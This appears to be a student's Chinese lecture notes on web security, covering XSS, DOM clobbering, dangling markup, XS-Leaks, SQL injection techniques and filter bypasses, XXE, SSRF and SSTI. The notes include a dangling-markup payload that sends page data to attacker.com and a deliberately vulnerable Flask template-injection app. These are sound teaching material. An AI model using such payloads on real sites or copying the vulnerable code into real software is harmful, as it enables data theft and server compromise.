# 用户侧攻击

- 服务器侧攻击
- SQL
- 命令注入&代码注入
- 反序列化攻击
- 服务端逻辑漏洞

用户侧：让浏览器在错误的信任假设中

- Victim：用户侧点击浏览器，发送http请求给服务器，服务器处理请求寻找对应的数据，发送一个http response给浏览器，浏览器渲染出前端页面。

# XSS
跨站脚本是一种web安全漏洞 

postmessage来协调页面嵌套的通信问题

# PoC/ Exploit
- poc:验证内容  **它的目的**：**证明**某个安全漏洞确实存在，并且是可以被触发的。它就像是一个“无害的警报器”。证明能
- payload：**Payload** 的中文通常译为 **“有效载荷”** 或 **“攻击载荷”**。
- exploit：一个完整的全自动恶意攻击脚本。
$$\text{Exploit（钻空子/打通隧道）} \longrightarrow \text{携带 Payload（投放炸弹）} \longrightarrow \text{目标系统执行（达成目的）}$$

伪协议： 
- php://
- data:
- javascript

autofocus
events

Vue v-html
unsafe-inline

# DOM
- **DOM（Document Object Model）** 是由 W3C 组织定义的一套**跨语言、跨平台的编程接口标准**。在浏览器里，它用 **树形数据结构** 来表示一个 HTML 或 XML 文档，让编程语言可以通过这个接口去增删改查页面内容，称为DOM树
- 浏览器解析html之后形成的一个结构
dom在内存中是一课倒挂的节点树
- **浏览器内存里的 DOM** = 用户正在看的、可交互的**真实网页实体**。
- dom树中每一个节点都代表html中的一个元素
![[Pasted image 20260714152057.png]]
javascript可以通过操作dom api来进行删除、添加等功能
不同浏览器对dom的处理方式不一定是相同的
- src：
	- **全称**：`src` 是 **Source** 的缩写，意为**“源”**或**“来源”**。
	    
	- **作用**：它是一个**HTML 属性**，用来指定外部资源文件（如图片、脚本、样式表或视频）的**网络地址（URL）或本地路径**。
### DOM  Clobbering
**DOM Clobbering** 是一种**HTML注入攻击**。攻击者利用浏览器的特性，通过注入包含特定 `id` 或 `name` 属性的HTML元素，来“覆盖”（clobber）JavaScript代码期望的全局变量或API。


- webpack：把大量的请求拆分打包一并发送

# Dangling Markup
**Dangling Markup（悬垂标记）** 是一种**无需执行脚本**的HTML注入攻击技术[](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)。它的核心目标是：在无法实现完整XSS攻击时，**窃取页面中本应属于浏览器的敏感数据**
html只是一种解释性语言
这种攻击利用了浏览器的一个特性：当HTML代码中**存在未闭合的标签或属性**时，浏览器不会报错，而是会继续解析后续内容，直到找到闭合符为止[](https://encyclopedia.kaspersky.com/glossary/dangling-markup/)。攻击者正是利用这一点，注入一个“悬垂”的标签，像“吸管”一样将后续的页面数据“吸”走[](https://www.huntress.com/cybersecurity-101/topic/what-is-dangling-markup?hnt=xkwrlj0cggw0)。
e.g.输入例子 
```
"><img src='https://attacker.com/?
```
Dangling Markup通常在**XSS攻击受阻时**被用作备选方案。它不执行恶意代码，而是巧妙地利用HTML的语法规则和浏览器的容错机制，将页面上的敏感信息“包装”成一个向攻击者发起的网络请求，从而实现跨域数据窃取。
# XS-Leaks 侧信道
XS-Leaks（全称 **Cross-Site Leaks**，即跨站泄漏）是一种**利用浏览器合法功能来探测用户在其他网站上的敏感信息**的攻击手段。攻击者无法直接窃取数据，但可以通过观察浏览器暴露的“蛛丝马迹”（即侧信道），像拼图一样推断出用户信息。
它的核心在于**通过观察侧信道信息来推断“是”或“否”的答案**。虽然单个泄漏的信息有限，但组合起来危害巨大。
受害者登陆网站，访问目标页面，攻击页跨站攻击嵌入，导航或者打开窗口，观察推断
这个是逐个bit泄露的
浏览器一般只接受同源的请求

# HTML
- 什么是html：html文档像一棵树
- CSS：样式表语言，用于描述html文档的外观和格式。其中`<style>`和其他某些标签可以控制css样式
- css injection是希望能够控制受害者收到的html文档中的css样式
- visited selector:链接被点击之后会改变颜色，变的不同,来标记这个链接已经被访问过了
- font-face trick：
- unicode-range

可以通过timing来检测一个网址是否已经被访问过了，访问时间更短的是已经被访问过的。
- performance API

web'漏洞：
- 前端漏洞：从用户侧中开始攻击
- 后端漏洞：注入漏洞。可以直接从数据库中拿到数据

# 后端漏洞
主要发现的漏洞是服务器侧的漏洞，进行信息的增删查改。
今天的助教听起来特别厉害，讲的感觉也很好。
# SQLi

### MySQL基础
最后都带一个分号；
![[Pasted image 20260717141241.png]]
- show databases:看到所有的数据库，每个数据库可以看成一个文件夹
- use 数据库名：查看某个数据库
- show tables:看具体数据库中的列表
- show columns from chars：返回一列一列的格式 从特定表中获取特定列
- select 1:返回一列
- select 1,database( ),version( ):按照表格的格式返回
- SELECT 1, DATABASE(), VERSION(), USER(), ASCII('A'), CONCAT('A','B')：concat是字符串拼接
- 注释：`/* */`  `-- ` # 
- /*!version_number 当数据库版本大于version_number(或version_number为空)时注释内容会被执行，否则就是普通注释*/
- SELECT * FROM table_name   /*从特定表中获取全部列*/
- SELECT * FROM table_name WHERE col_name = XXX    /*在限定条件下取数据*/ 
		select id,username from users where id>1 and username="";  这种就可以写一个用户登录系统的逻辑 
- SELECT * FROM table_name ORDER BY col_name(col_index) /*根据列名或索引排序*/
		select 
- SELECT col_name1, col_name2… FROM table_name LIMIT N, M  /*从第N(从0开始)条开始返回M条数据*/
注意行是从第0行开始，列是第1列开始数
- SELECT concat(col_name1, col_name2…) FROM table_name /*整合列数据*/
数据查询是每一行执行一遍语句，如果符合就执行
- SELECT group_concat(col_name1, col_name2…) FROM table_name /*整合行、列数据*/

### URL
把一些特定字符转换为百分号加ASCII码值
![[Pasted image 20260717143422.png]]
### 网站工作架构

![[Pasted image 20260717144023.png]]
用户发送一个http请求，输入限定条件，apache打开一个端口接收http请求，然后执行一次php代码。

### SQL注入一般方法
- 直接回显的SQL
	![[Pasted image 20260717144436.png]]
	![[Pasted image 20260717144609.png]]
	借助联合查询:
	SELECT field1, …, fieldN FROM table_name UNION SELECT field1*, …, fieldN* FROM table_name*;
	group_concat:可以把每一行的内容整合起来放在一行输出

- 无回显的SQL注入
	MySQL会自动把两个中间含空格的字符串自动拼接在一起，这样就可以看出是用单引号还是双引号闭合的，两个字符串中间用加号也是一样的效果。加号不是通用的，因为php的标准是有两种的，有些时候加号会被认为是空格的效果。
	http传参数的时候不会把#完整传入，最好是用%23
	![[Pasted image 20260717150912.png]]
	这样就可以用二分查找的方法1bit1bit这样把数据偷出来
- 或者采用时间盲注的方法，通过sleep函数的返回时间来判断if中的条件语句是否是正确的
	![[Pasted image 20260717151502.png]]
	但是不能用or，因为如果or前面的语句如果成立了，但是它还会往下去每一行去判断是否符合条件，这样每一行的时间是不确定的，这样就不能通过时间来判断是否是正确的了。
	明白数据库中的查询是一行一行的查询的
	![[Pasted image 20260717151945.png]]
	每一条指令都是先被解析再执行
	MySQL中每个字符串在运算的时候都相当于0来处理
	
	![[Pasted image 20260717152229.png]]
- 报错注入
	![[Pasted image 20260717152503.png]]
	就是构造输入地址的格式本身就是错误的，所以导致它一定会报错，0x7e是波浪号的十六进制。在错误信息中可能会输出你想要的信息内容。
- 堆叠注入
	![[Pasted image 20260717152811.png]]
WAF：防火墙

### SQL绕过防护方法
常见防护方法：
- 直接拦截：类似防火墙
- 关键字替换--通过大小写、正则匹配、利用等价命令、double关键词（如果是删除）绕过
- 编码转义
- 参数化查询：预编译一条指令，会让传入的参数都当做字符串来执行，不会去执行，这种一般是无法绕过的

![[Pasted image 20260717154000.png]]
如果是防火墙的滤过机制和后端代码的过滤机制不同，就可以绕过防火墙攻击后端代码
slash是反斜杠

## 其他的SQL注入漏洞
- XXE：
	![[Pasted image 20260717154507.png]]
- SSRF：
	![[Pasted image 20260717154544.png]]
- SSTI：
	![[Pasted image 20260717154650.png]]
	```
	from flask import Flask,request,render_template_string
	
	app = Flask(__name__)
	
	  
	
	@app.route('/', methods=['GET', 'POST'])
	
	def index():
	
	    name = request.args.get('name')
	
	    template = '''
	
	<html>
	
	  <head>
	
	    <title>SSTI</title>
	
	  </head>
	
	 <body>
	
	      <h3>Hello, %s!</h3>
	
	  </body>
	
	</html>
	
	        '''% (name)
	
	    return render_template_string(template)
	
	  
	  
	
	if __name__ == "__main__":
	
	    app.run(host="0.0.0.0", port=1234, debug=True)
	```
	python是个面向对象的编程的语言，可以从特定类到子类，再到特定对象一层层下套进行解析


